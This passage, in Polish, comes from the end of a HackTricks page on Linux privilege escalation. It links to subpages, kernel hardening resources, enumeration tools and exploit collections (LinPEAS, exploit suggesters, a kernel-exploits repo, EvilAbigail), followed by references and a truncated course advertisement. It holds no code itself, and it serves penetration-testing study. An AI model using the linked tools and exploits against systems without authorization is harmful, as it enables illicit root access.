[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Ucieczka z ograniczonych powłok

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Ochrona jądra systemu

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Statyczne pliki wykonywalne impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Narzędzia do eskalacji uprawnień w systemach Linux/Unix

### **Najlepsze narzędzie do szukania wektorów eskalacji uprawnień lokalnych w systemach Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opcja -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Wyliczanie podatności jądra w systemach Linux i MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (dostęp fizyczny):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Kompilacja innych skryptów**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Odwołania

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję eksklu
